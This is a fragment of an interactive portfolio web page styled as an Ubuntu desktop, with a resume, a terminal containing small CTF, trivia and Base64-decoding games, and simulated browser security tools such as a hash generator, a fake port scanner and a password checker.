+<div>Version: Ubuntu Terminal OS 24.10</div>
+<div>Kernel: 6.8.0-cyber</div>
+<div>Theme: Ubuntu Orange</div>
+<div>User: smarty@ubuntu</div>
+</div>
+</div>
+
+<div style="padding:16px;background:rgba(233,84,32,0.1);border:1px solid rgba(233,84,32,0.3);border-radius:8px;text-align:center">
+<button class="encoder-btn" onclick="resetSettings()">🔄 Reset All Settings</button>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Context Menu -->
+<div class="context-menu" id="contextMenu">
+<div class="context-menu-item" onclick="openApp(&quot;about&quot;)">
+<span class="icon">👤</span>
+<span>About Me</span>
+</div>
+<div class="context-menu-item" onclick="openApp(&quot;terminal&quot;)">
+<span class="icon">💻</span>
+<span>Open Terminal</span>
+</div>
+<div class="context-menu-divider"></div>
+<div class="context-menu-item" onclick="openApp(&quot;settings&quot;)">
+<span class="icon">⚙️</span>
+<span>Settings</span>
+</div>
+<div class="context-menu-item" onclick="showNotification(&quot;System&quot;,&quot;Desktop refreshed&quot;)">
+<span class="icon">🔄</span>
+<span>Refresh</span>
+</div>
+</div>
+
+<!-- Notification -->
+<div class="notification" id="notification">
+<div class="notification-title" id="notificationTitle">Notification</div>
+<div class="notification-message" id="notificationMessage">Message</div>
+</div>
+
+</div>
+<script>
+// Audio Context for Login/Logout Sounds
+const audioCtx=new(window.AudioContext||window.webkitAudioContext)();
+function playBeep(freq,duration){
+if(!document.getElementById('soundToggle').checked)return;
+const osc=audioCtx.createOscillator();
+const gain=audioCtx.createGain();
+osc.connect(gain);
+gain.connect(audioCtx.destination);
+osc.frequency.value=freq;
+osc.type='sine';
+gain.gain.setValueAtTime(0.3,audioCtx.currentTime);
+gain.gain.exponentialRampToValueAtTime(0.01,audioCtx.currentTime+duration);
+osc.start(audioCtx.currentTime);
+osc.stop(audioCtx.currentTime+duration);
+}
+
+// Login System
+const correctPassword='ubuntu';
+const loginScreen=document.getElementById('login-screen');
+const desktop=document.getElementById('desktop');
+const passwordInput=document.getElementById('passwordInput');
+const loginBtn=document.getElementById('loginBtn');
+const loginError=document.getElementById('loginError');
+
+function updateLoginTime(){
+const now=new Date();
+const time=now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false});
+const date=now.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric'});
+document.getElementById('loginTime').textContent=time;
+document.getElementById('loginDate').textContent=date;
+}
+setInterval(updateLoginTime,1000);
+updateLoginTime();
+
+function login(){
+if(passwordInput.value===correctPassword){
+playBeep(800,0.1);
+setTimeout(()=>playBeep(1000,0.1),100);
+loginScreen.classList.add('hidden');
+setTimeout(()=>{
+desktop.classList.add('active');
+showNotification('System','Welcome back, SmaRTy!');
+},500);
+}else{
+loginError.classList.add('show');
+playBeep(200,0.3);
+passwordInput.value='';
+setTimeout(()=>loginError.classList.remove('show'),2000);
+}
+}
+
+loginBtn.addEventListener('click',login);
+passwordInput.addEventListener('keypress',e=>{
+if(e.key==='Enter')login();
+});
+
+// Logout System
+function logout(){
+if(confirm('Are you sure you want to logout?')){
+playBeep(600,0.1);
+setTimeout(()=>playBeep(400,0.1),100);
+desktop.classList.remove('active');
+// Close all windows
+document.querySelectorAll('.window.active').forEach(w=>w.classList.remove('active'));
+// Reset dock icons
+document.querySelectorAll('.dock-icon.active').forEach(i=>i.classList.remove('active'));
+setTimeout(()=>{
+loginScreen.classList.remove('hidden');
+passwordInput.value='';
+showNotification('System','Logged out successfully');
+},300);
+}
+}
+
+document.getElementById('logoutBtn').addEventListener('click',logout);
+
+// System Stats
+function updateStats(){
+const now=new Date();
+document.getElementById('currentTime').textContent=now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false});
+const months=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+document.getElementById('currentDate').textContent=months[now.getMonth()]+' '+now.getDate();
+document.getElementById('ramUsage').textContent=Math.floor(Math.random()*200+800);
+document.getElementById('cpuUsage').textContent=Math.floor(Math.random()*30+10);
+document.getElementById('networkSpeed').textContent=Math.floor(Math.random()*500+100);
+const openWindows=document.querySelectorAll('.window.active').length;
+document.getElementById('windowCount').textContent=openWindows;
+}
+setInterval(updateStats,1000);
+updateStats();
+
+// Window Management
+let draggedWindow=null;
+let offsetX=0;
+let offsetY=0;
+let zIndexCounter=100;
+
+function openApp(app){
+const window=document.getElementById('w-'+app);
+if(!window)return;
+window.classList.add('active');
+window.style.zIndex=++zIndexCounter;
+const dockIcon=document.querySelector(`.dock-icon[data-app="${app}"]`);
+if(dockIcon)dockIcon.classList.add('active');
+playBeep(600,0.05);
+showNotification(window.querySelector('.window-title').textContent.split(' ').slice(1).join(' '),'Window opened');
+updateStats();
+if(app==='terminal'){
+setTimeout(()=>document.getElementById('terminalInput').focus(),100);
+}
+if(app==='browser'){
+// Auto-load resume when browser opens
+setTimeout(()=>{
+const resumeContent=`
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Balwinder Singh - Resume</title>
+<style>
+body{font-family:Arial,sans-serif;max-width:900px;margin:40px auto;padding:20px;background:#f5f5f5;color:#333}
+h1{color:#E95420;border-bottom:3px solid #E95420;padding-bottom:10px}
+h2{color:#E95420;margin-top:30px;border-bottom:2px solid #ddd;padding-bottom:8px}
+.section{margin:20px 0}
+.contact{background:#fff;padding:15px;border-left:4px solid #E95420;margin:20px 0}
+.skills{display:grid;grid-template-columns:repeat(2,1fr);gap:15px}
+.skill-item{background:#fff;padding:15px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+ul{line-height:1.8}
+a{color:#E95420;text-decoration:none}
+a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<h1>Balwinder Singh</h1>
+<div class="contact">
+<strong>📧 Email:</strong> contact@smartysaini.com<br>
+<strong>💼 LinkedIn:</strong> <a href="https://linkedin.com/in/smarty-saini" target="_blank">linkedin.com/in/smarty-saini</a><br>
+<strong>🐙 GitHub:</strong> <a href="https://github.com/smarty-saini" target="_blank">github.com/smarty-saini</a>
+</div>
+
+<h2>💼 Professional Summary</h2>
+<p>Seasoned cybersecurity professional with 15+ years specializing in penetration testing, red team operations, and security research. Extensive healthcare IT expertise with 1,000+ HL7 integration instances deployed across 40+ EMR/EHR systems. Active CTF player, bug bounty hunter, and HIPAA compliance specialist.</p>
+
+<h2>🎯 Core Competencies</h2>
+<div class="skills">
+<div class="skill-item">
+<h3 style="color:#E95420;font-size:16px">Cybersecurity</h3>
+<ul>
+<li>Penetration Testing & Red Teaming</li>
+<li>Web Application Security</li>
+<li>Network Security & Exploitation</li>
+<li>Vulnerability Assessment</li>
+<li>Security Research & POC Development</li>
+</ul>
+</div>
+<div class="skill-item">
+<h3 style="color:#E95420;font-size:16px">Healthcare IT</h3>
+<ul>
+<li>HL7 v2.x/v3 Integration (1,000+ instances)</li>
+<li>FHIR & CCD/CCDA Implementation</li>
+<li>EMR/EHR Systems (40+ platforms)</li>
+<li>HIPAA Compliance & Security</li>
+<li>Custom Integration Solutions</li>
+</ul>
+</div>
+</div>
+
+<h2>🛠️ Technical Skills</h2>
+<div class="section">
+<p><strong>Security Tools:</strong> Burp Suite Pro, Metasploit, Nmap, SQLMap, Hashcat, Wireshark, BloodHound, Empire, Cobalt Strike</p>
+<p><strong>Integration Engines:</strong> Mirth Connect, Rhapsody, Cloverleaf, Ensemble, Custom Middleware</p>
+<p><strong>Programming:</strong> Python, Bash, PowerShell, JavaScript, Go, C/C++, SQL</p>
+<p><strong>EMR/EHR Systems:</strong> Athena, Cerner, Epic (OCHIN), NextGen, Medisoft, LabSoft, Ellkay, AllScripts, eClinicalWorks</p>
+</div>
+
+<h2>🎓 Certifications</h2>
+<div class="skills">
+<div class="skill-item" style="text-align:center">
+<div style="font-size:32px">🎓</div>
+<h3 style="color:#E95420">CCEP</h3>
+<p>Nov 2025</p>
+</div>
+<div class="skill-item" style="text-align:center">
+<div style="font-size:32px">🛡️</div>
+<h3 style="color:#E95420">Red Teaming</h3>
+<p>2025</p>
+</div>
+<div class="skill-item" style="text-align:center">
+<div style="font-size:32px">🔐</div>
+<h3 style="color:#E95420">Bug Bounty</h3>
+<p>2025</p>
+</div>
+</div>
+
+<div style="margin-top:40px;padding:20px;background:#E95420;color:#fff;text-align:center;border-radius:8px">
+<h3>Want to connect?</h3>
+<p>Feel free to reach out via email or LinkedIn!</p>
+</div>
+</body>
+</html>
+`;
+const frame=document.getElementById('browserFrame');
+const loading=document.getElementById('browserLoading');
+const error=document.getElementById('browserError');
+loading.style.display='flex';
+error.style.display='none';
+setTimeout(()=>{
+frame.srcdoc=resumeContent;
+frame.style.display='block';
+loading.style.display='none';
+document.getElementById('browserURL').value='resume://smarty-saini';
+showNotification('Browser','Resume loaded');
+},500);
+},300);
+}
+}
+
+function closeWindow(windowId){
+const window=document.getElementById(windowId);
+if(!window)return;
+window.classList.remove('active');
+const app=windowId.replace('w-','');
+const dockIcon=document.querySelector(`.dock-icon[data-app="${app}"]`);
+if(dockIcon)dockIcon.classList.remove('active');
+playBeep(400,0.05);
+updateStats();
+}
+
+function maximizeWindow(windowId){
+const window=document.getElementById(windowId);
+if(!window)return;
+window.classList.toggle('maximized');
+playBeep(700,0.05);
+}
+
+// Event Delegation
+document.addEventListener('click',e=>{
+if(e.target.matches('[data-close]')){
+closeWindow(e.target.dataset.close);
+}
+if(e.target.matches('[data-max]')){
+maximizeWindow(e.target.dataset.max);
+}
+if(e.target.matches('[data-app]')||e.target.closest('[data-app]')){
+const appElement=e.target.matches('[data-app]')?e.target:e.target.closest('[data-app]');
+openApp(appElement.dataset.app);
+}
+});
+
+// Window Dragging
+document.addEventListener('mousedown',e=>{
+if(e.target.classList.contains('window-header')||e.target.closest('.window-header')){
+const window=e.target.closest('.window');
+if(!window||window.classList.contains('maximized'))return;
+draggedWindow=window;
+window.style.zIndex=++zIndexCounter;
+const rect=window.getBoundingClientRect();
+offsetX=e.clientX-rect.left;
+offsetY=e.clientY-rect.top;
+}
+});
+
+document.addEventListener('mousemove',e=>{
+if(draggedWindow){
+draggedWindow.style.left=(e.clientX-offsetX)+'px';
+draggedWindow.style.top=(e.clientY-offsetY)+'px';
+}
+});
+
+document.addEventListener('mouseup',()=>{
+draggedWindow=null;
+});
+
+// Terminal Commands with CTF Challenge
+const terminalOutput=document.getElementById('terminalOutput');
+const terminalInput=document.getElementById('terminalInput');
+let ctfStarted=false;
+let ctfSolved=false;
+const ctfFlag='CTF{w3lc0m3_t0_th3_m4tr1x}';
+
+// Game state variables
+let guessGameActive=false;
+let guessTarget=0;
+let guessAttempts=0;
+let triviaGameActive=false;
+let triviaScore=0;
+let triviaCurrentQ=0;
+let hashGameActive=false;
+let hashTarget='';
+let hashWord='';
+
+const triviaQuestions=[
+{q:'What port does HTTP typically use?',a:'80'},
+{q:'What does XSS stand for?',a:'cross site scripting'},
+{q:'What is the default SSH port?',a:'22'},
+{q:'What does SQL stand for?',a:'structured query language'},
+{q:'What is the most common hash length for MD5 in characters?',a:'32'},
+{q:'What protocol is used for secure web browsing?',a:'https'},
+{q:'What does CVE stand for?',a:'common vulnerabilities and exposures'},
+{q:'What is the default MySQL port?',a:'3306'}
+];
+
+const hashWords=['admin','password','root','user','test','hello','world','security'];
+
+const commands={
+help:`Available commands:
+  help       - Show this help message
+  about      - Display information about me
+  skills     - List my technical skills
+  contact    - Show contact information
+  email      - Display email address
+  linkedin   - Show LinkedIn profile
+  github     - Show GitHub profile
+  location   - Display location
+  clear      - Clear terminal
+  ctf        - Start a CTF challenge
+  guess      - Play number guessing game
+  trivia     - Play cybersecurity trivia
+  hash       - Play hash cracking game
+  ls         - List files
+  whoami     - Display current user
+  date       - Show current date and time
+  neofetch   - Display system information
+  exit       - Close terminal`,
+
+about:`SmaRTy Saini - Cybersecurity Professional & Healthcare Integration Specialist
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 Penetration Tester | CTF Player | Bug Bounty Hunter
+🏥 Healthcare Interoperability Expert | HL7 Integration Specialist
+💼 15+ years of experience in cybersecurity & healthcare IT
+🔐 Active on HackTheBox, TryHackMe, PortSwigger Academy
+🏆 1,000+ HL7 integration instances deployed
+📡 40+ EMR/EHR systems: Athena, Cerner, Epic-OCHIN, NextGen, Medisoft, LabSoft, Ellkay, and more`,
+
+skills:`Technical Skills & Tools:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 Reconnaissance: Nmap, Masscan, Amass, HTTPX
+🕸️  Web Exploitation: Burp Suite, SQLMap, XSStrike
+💉 Post-Exploitation: Metasploit, Empire, Mimikatz
+🔓 Password Attacks: Hashcat, John, Hydra
+📡 Network Tools: Wireshark, Aircrack-ng, Bettercap
+🐍 Scripting: Python, Bash, PowerShell, Go`,
+
+whoami:'smarty@ubuntu',
+
+contact:`Contact Information:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 Email: contact@smartysaini.com
+💼 LinkedIn: linkedin.com/in/smarty-saini
+🐙 GitHub: github.com/smarty-saini
+𝕏 Twitter: @smarty_saini
+📍 Location: Available for remote opportunities worldwide
+🌐 Portfolio: [This interactive terminal!]
+
+Type 'email', 'linkedin', or 'github' for specific links!`,
+
+email:`📧 Email Address:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+contact@smartysaini.com
+
+Feel free to reach out for:
+• Job opportunities
+• Collaboration on security projects  
+• HL7 integration consulting
+• Bug bounty program inquiries
+• Speaking engagements`,
+
+linkedin:`💼 LinkedIn Profile:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+https://linkedin.com/in/smarty-saini
+
+Connect with me on LinkedIn for:
+• Professional networking
+• Career updates
+• Industry insights
+• Cybersecurity discussions`,
+
+github:`🐙 GitHub Profile:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+https://github.com/smarty-saini
+
+Check out my repositories:
+• Security tools & exploits
+• HL7 integration scripts
+• CTF writeups
+• Automation scripts
+• Open source contributions`,
+
+location:`📍 Location:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 Available worldwide (Remote)
+🇺🇸 Based in United States
+⏰ Timezone: PST/PDT (UTC-8/-7)
+
+Open to:
+• Remote cybersecurity positions
+• Healthcare IT consulting
+• Contract/freelance work
+• Part-time engagements`,
+
+w3lc0m3_t0_th3_m4tr1x:`🎉 CONGRATULATIONS! YOU FOUND THE SECRET COMMAND!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🏆 Achievement Unlocked: Matrix Hacker
+🎯 You discovered the hidden command path!
+
+"Welcome to the Matrix, Neo..."
+
+This command is the CTF flag itself. You can now submit it
+in the CTF challenge for bonus points!
+
+🚀 Keep exploring, hacker. There are more secrets to find...
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+
+date:new Date().toString(),
+
+ls:`total 48
+drwxr-xr-x  2 smarty smarty 4096 Nov 23 21:00 Documents
+drwxr-xr-x  2 smarty smarty 4096 Nov 23 21:00 Downloads
+drwxr-xr-x  2 smarty smarty 4096 Nov 23 21:00 Projects
+-rw-r--r--  1 smarty smarty  807 Nov 23 21:00 flag.txt
+-rwxr-xr-x  1 smarty smarty 8192 Nov 23 21:00 exploit.sh`,
+
+neofetch:`                   smarty@ubuntu
+         .-/+oossssoo+/-.             ───────────────────────
+      :+ssssssssssssssssss+:          OS: Ubuntu -SmaRTy OS 24.10
+    -+ssssssssssssssssssyyssss+-      Host: Ubuntu Portfolio
+  .osssssssssssssssssssdMMMNysssso.   Kernel: 6.8.0-cyber
+ /ssssssssssshdmmNNmmyNMMMMhssssss/   Uptime: ${Math.floor(Math.random()*100+20)} mins
++ssssssssshmydMMMMMMMNddddyssssssss+  Shell: bash 5.2.21
+/sssssssshNMMMyhhyyyyhmNMMMNhssssss/  Resolution: 1920x1080
+.ssssssssdMMMNhsssssssssshNMMMdssssss. Terminal: smarty-terminal
+ +sssshhhyNMMNyssssssssssssyNMMMysssss+ CPU: Intel i7-12700K (12) @ 5.0GHz
+  ossyNMMMNyMMhsssssssssssssshmmmhssss- Memory: ${document.getElementById('ramUsage').textContent}MB / 16384MB
+   +mMMMMMMMMNyssssssssssshMMMMmhsssss- Disk: 512GB NVMe SSD
+    yMMMMMMMMMMmhyyyssssssNMMMMMssssss
+     /MMMMMMMMMMMNmmmyssyyyy NMMMssss/  Theme: Ubuntu Orange
+       NMMMMMMMMMMMMMMMMmdhhydNMMMh/    Icons: Custom Emoji Pack
+        /dMMMMMMMMMMMMMMMMMMMNdy+:      WM: Ubuntu-OS-Simulator
+          :osssssssssssssssss+:`
+};
+
+terminalInput.addEventListener('keypress',e=>{
+if(e.key==='Enter'){
+const cmd=terminalInput.value.trim();
+terminalInput.value='';
+if(!cmd)return;
+
+const outputLine=document.createElement('div');
+outputLine.className='terminal-line';
+outputLine.innerHTML=`<span class="terminal-prompt">smarty@ubuntu:~$<\/span> ${cmd}`;
+terminalOutput.insertBefore(outputLine,terminalOutput.lastElementChild);
+
+if(cmd==='clear'){
+const lines=terminalOutput.querySelectorAll('.terminal-line');
+lines.forEach(line=>{
+if(!line.querySelector('.terminal-prompt'))line.remove();
+});
+return;
+}
+
+// Number Guessing Game
+if(cmd==='guess'){
+guessGameActive=true;
+guessTarget=Math.floor(Math.random()*100)+1;
+guessAttempts=0;
+addTerminalLine(`
+🎲 NUMBER GUESSING GAME
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+I'm thinking of a number between 1 and 100.
+Try to guess it! Type your guess as a number.
+
+Type 'quit' to exit the game.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+return;
+}
+
+if(guessGameActive){
+if(cmd==='quit'){
+guessGameActive=false;
+addTerminalLine('Game ended. Thanks for playing!');
+return;
+}
+const guess=parseInt(cmd);
+if(isNaN(guess)){
+addTerminalLine('Please enter a valid number or "quit" to exit.');
+return;
+}
+guessAttempts++;
+if(guess===guessTarget){
+addTerminalLine(`
+🎉 CORRECT! You guessed it in ${guessAttempts} attempts!
+The number was ${guessTarget}.
+Type 'guess' to play again!`);
+guessGameActive=false;
+playBeep(800,0.1);
+setTimeout(()=>playBeep(1000,0.1),100);
+}else if(guess<guessTarget){
+addTerminalLine(`📈 Too low! Try a higher number. (Attempt ${guessAttempts})`);
+playBeep(400,0.1);
+}else{
+addTerminalLine(`📉 Too high! Try a lower number. (Attempt ${guessAttempts})`);
+playBeep(400,0.1);
+}
+return;
+}
+
+// Trivia Game
+if(cmd==='trivia'){
+triviaGameActive=true;
+triviaScore=0;
+triviaCurrentQ=Math.floor(Math.random()*triviaQuestions.length);
+const q=triviaQuestions[triviaCurrentQ];
+addTerminalLine(`
+🧠 CYBERSECURITY TRIVIA
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Score: ${triviaScore}
+
+Question: ${q.q}
+
+Type your answer or 'quit' to exit.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+return;
+}
+
+if(triviaGameActive){
+if(cmd==='quit'){
+triviaGameActive=false;
+addTerminalLine(`Game ended. Final score: ${triviaScore}`);
+return;
+}
+const q=triviaQuestions[triviaCurrentQ];
+if(cmd.toLowerCase()===q.a.toLowerCase()||cmd.toLowerCase().includes(q.a.toLowerCase())){
+triviaScore+=10;
+addTerminalLine(`✅ Correct! +10 points. Score: ${triviaScore}`);
+playBeep(800,0.1);
+triviaCurrentQ=Math.floor(Math.random()*triviaQuestions.length);
+const nextQ=triviaQuestions[triviaCurrentQ];
+setTimeout(()=>addTerminalLine(`\nNext Question: ${nextQ.q}`),500);
+}else{
+addTerminalLine(`❌ Wrong! The answer was: ${q.a}`);
+playBeep(400,0.1);
+addTerminalLine(`Final Score: ${triviaScore}. Type 'trivia' to play again!`);
+triviaGameActive=false;
+}
+return;
+}
+
+// Hash Cracking Game  
+if(cmd==='hash'){
+hashGameActive=true;
+hashWord=hashWords[Math.floor(Math.random()*hashWords.length)];
+hashTarget=btoa(hashWord);
+addTerminalLine(`
+🔐 HASH CRACKER GAME
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Crack this Base64 encoded string:
+${hashTarget}
+
+Hint: It's a common word (lowercase, no spaces)
+Type your answer or 'quit' to exit.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+return;
+}
+
+if(hashGameActive){
+if(cmd==='quit'){
+hashGameActive=false;
+addTerminalLine(`Game ended. The word was: ${hashWord}`);
+return;
+}
+if(cmd.toLowerCase()===hashWord.toLowerCase()){
+addTerminalLine(`
+🎉 CRACKED! You decoded it correctly!
+The word was: ${hashWord}
+Hash was: ${hashTarget}
+
+Type 'hash' to play again!`);
+hashGameActive=false;
+playBeep(800,0.1);
+setTimeout(()=>playBeep(1000,0.1),100);
+}else{
+addTerminalLine(`❌ Wrong! Try again or type 'quit' to give up.`);
+playBeep(400,0.1);
+}
+return;
+}
+
+if(cmd==='ctf'){
+if(!ctfStarted){
+ctfStarted=true;
+addTerminalLine(`
+🎯 CTF CHALLENGE INITIATED
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Challenge: Find the Hidden Flag
+Difficulty: Easy
+Points: 100
+
+Hint: The flag is hidden in the HTML source code.
+      Look for an HTML comment near the footer.
+      Or check the browser console (F12)!
+      Format: CTF{...}
+
+Type the flag when you find it!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+}else{
+addTerminalLine('CTF challenge already started! Find the flag and submit it.');
+}
+return;
+}
+
+if(ctfStarted&&cmd.startsWith('CTF{')){
+if(cmd===ctfFlag){
+ctfSolved=true;
+addTerminalLine(`
+🎉 CORRECT! FLAG CAPTURED!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Congratulations! You solved the challenge.
++100 points
+
+The flag was: ${ctfFlag}
+
+Great job! Want to try another challenge?
+Visit HackTheBox or TryHackMe for more!
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+playBeep(800,0.1);
+setTimeout(()=>playBeep(1000,0.1),100);
+setTimeout(()=>playBeep(1200,0.2),200);
+}else{
+addTerminalLine('❌ Incorrect flag. Keep looking!');
+playBeep(300,0.2);
+}
+return;
+}
+
+const output=commands[cmd]||`Command not found: ${cmd}. Type 'help' for available commands.`;
+addTerminalLine(output);
+
+if(cmd==='exit'){
+closeWindow('w-terminal');
+}
+}
+});
+
+function addTerminalLine(text){
+const line=document.createElement('div');
+line.className='terminal-line';
+line.textContent=text;
+terminalOutput.insertBefore(line,terminalOutput.lastElementChild);
+terminalOutput.scrollTop=terminalOutput.scrollHeight;
+}
+
+// Security Tools Functions
+async function generateHash(algorithm){
+const text=document.getElementById('hashInput').value;
+if(!text){
+showNotification('Hash Generator','Please enter text to hash');
+return;
+}
+
+const encoder=new TextEncoder();
+const data=encoder.encode(text);
+let hashBuffer;
+
+try{
+switch(algorithm){
+case 'md5':
+document.getElementById('hashOutput').value='MD5 hashing requires external library.\nFor demo: '+btoa(text).substring(0,32);
+showNotification('Hash Generator','MD5 hash generated (simulated)');
+return;
+case 'sha1':
+hashBuffer=await crypto.subtle.digest('SHA-1',data);
+break;
+case 'sha256':
+hashBuffer=await crypto.subtle.digest('SHA-256',data);
+break;
+case 'sha512':
+hashBuffer=await crypto.subtle.digest('SHA-512',data);
+break;
+}
+
+const hashArray=Array.from(new Uint8Array(hashBuffer));
+const hashHex=hashArray.map(b=>b.toString(16).padStart(2,'0')).join('');
+document.getElementById('hashOutput').value=hashHex;
+showNotification('Hash Generator',`${algorithm.toUpperCase()} hash generated successfully`);
+}catch(e){
+showNotification('Error','Failed to generate hash');
+}
+}
+
+function scanCommonPorts(){
+const host=document.getElementById('portScanHost').value||'192.168.1.1';
+const output=document.getElementById('portScanOutput');
+const commonPorts=[21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443];
+const portNames={21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'PostgreSQL',8080:'HTTP-Alt',8443:'HTTPS-Alt'};
+
+output.value=`Starting Nmap-style scan on ${host}\n`;
+output.value+=`Scanning common ports...\n\n`;
+output.value+=`PORT     STATE   SERVICE\n`;
+output.value+=`━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+
+commonPorts.forEach(port=>{
+const state=Math.random()>0.7?'open':'closed';
+const service=portNames[port]||'unknown';
+output.value+=`${port.toString().padEnd(8)} ${state.padEnd(7)} ${service}\n`;
+});
+
+output.value+=`\nScan complete: ${commonPorts.length} ports scanned\n`;
+showNotification('Port Scanner','Common ports scan complete');
+}
+
+function scanAllPorts(){
+const host=document.getElementById('portScanHost').value||'192.168.1.1';
+const output=document.getElementById('portScanOutput');
+
+output.value=`Starting intensive scan on ${host}\n`;
+output.value+=`Scanning 1024 ports [0-1023]...\n\n`;
+
+let openCount=0;
+const openPorts=[];
+
+for(let i=1;i<=1024;i++){
+if(Math.random()>0.95){
+openPorts.push(i);
+openCount++;
+}
+}
+
+output.value+=`PORT     STATE   \n`;
+output.value+=`━━━━━━━━━━━━━━━━\n`;
+openPorts.forEach(port=>{
+output.value+=`${port.toString().padEnd(8)} open\n`;
+});
+
+output.value+=`\nScan complete: ${openCount} open ports found out of 1024 scanned\n`;
+showNotification('Port Scanner',`Full scan complete - ${openCount} open ports`);
+}
+
+function togglePasswordVisibility(){
+const input=document.getElementById('passwordCheck');
+input.type=input.type==='password'?'text':'password';
+}
+
+function analyzePassword(){
+const password=document.getElementById('passwordCheck').value;
+if(!password){
+showNotification('Password Checker','Please enter a password');
+return;
+}
+
+const output=document.getElementById('passwordStrengthOutput');
+let score=0;
+let feedback=[];
+
+// Length check
+if(password.length>=12)score+=25;
+else if(password.length>=8)score+=15;
+else feedback.push('❌ Use at least 12 characters');
+
+// Character variety
+if(/[a-z]/.test(password))score+=15;
+else feedback.push('❌ Add lowercase letters');
+
+if(/[A-Z]/.test(password))score+=15;
+else feedback.push('❌ Add uppercase letters');
+
+if(/[0-9]/.test(password))score+=15;
+else feedback.push('❌ Add numbers');
+
+if(/[^a-zA-Z0-9]/.test(password))score+=20;
+else feedback.push('❌ Add special characters');
+
+// No common patterns
+if(!/123|abc|qwerty|password|admin/i.test(password))score+=10;
+else feedback.push('⚠️ Avoid common patterns');
+
+let strength,color;
+if(score>=80){strength='Very Strong 🛡️';color='#73C48F';}
+else if(score>=60){strength='Strong 💪';color='#E95420';}
+else if(score>=40){strength='Moderate ⚠️';color='#F0A13D';}
+else{strength='Weak ❌';color='#F46067';}
+
+output.innerHTML=`
+<div style="padding:20px;background:rgba(26,31,58,0.6);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+<h4 style="color:#E95420">Password Strength: <span style="color:${color}">${strength}<\/span><\/h4>
+<div style="font-size:24px;font-weight:700;color:${color}">${score}/100<\/div>
+<\/div>
+<div style="background:rgba(0,0,0,0.3);height:10px;border-radius:5px;overflow:hidden">
+<div style="width:${score}%;height:100%;background:${color};transition:width 0.3s"><\/div>
+<\/div>
+<div style="margin-top:16px;font-size:13px;color:var(--text-dim)">
+<strong style="color:#E95420">Length:<\/strong> ${password.length} characters<br>
+<strong style="color:#E95420">Estimated Time to Crack:<\/strong> ${estimateCrackTime(score)}
+<\/div>
+${feedback.length>0?`<div style="margin-top:16px;padding:12px;background:rgba(255,0,110,0.1);border:1px solid rgba(255,0,110,0.3);border-radius:8px">
+<strong style="color:#FF006E">Recommendations:<\/strong><br>
+${feedback.join('<br>')}
+<\/div>`:`<div style="margin-top:16px;padding:12px;background:rgba(115,196,143,0.1);border:1px solid rgba(115,196,143,0.3);border-radius:8px;color:#73C48F">
+✅ Excellent password! All security criteria met.
+<\/div>`}
+<\/div>
+`;
+
+showNotification('Password Checker','Analysis complete');
+}
+
+function estimateCrackTime(score){
+if(score>=80)return'Centuries (brute force)';
+if(score>=60)return'Years';
+if(score>=40)return'Months';
+return'Minutes to Hours';
+}
+
+function generateStrongPassword(){
+const length=16;
+const charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?';
+let password='';
+const array=new Uint32Array(length);
+crypto.getRandomValues(array);
+for(let i=0;i<length;i++){
+password+=charset[array[i]%charset.length];
+}
+document.getElementById('passwordCheck').value=password;
+analyzePassword();
+showNotification('Password Generator','Strong password generated!');
+}
+
+function decodeJWT(){
+const jwt=document.getElementById('jwtInput').value.trim();
+if(!jwt){
+showNotification('JWT Decoder','Please enter a JWT token');
+return;
+}
+
+try{
+const parts=jwt.split('.');
+if(parts.length!==3){
+throw new Error('Invalid JWT format');
+}
+
+const header=JSON.parse(atob(parts[0]));
+const payload=JSON.parse(atob(parts[1]));
+const signature=parts[2];
+
+document.getElementById('jwtOutput').innerHTML=`
+<div style="padding:20px;background:rgba(26,31,58,0.6);border:1px solid rgba(233,84,32,0.3);border-radius:12px">
+<h4 style="color:#E95420;margin-bottom:12px">🔷 Header<\/h4>
+<pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;overflow-x:auto;font-size:12px;color:var(--text)">${JSON.stringify(header,null,2)}</pre>
+
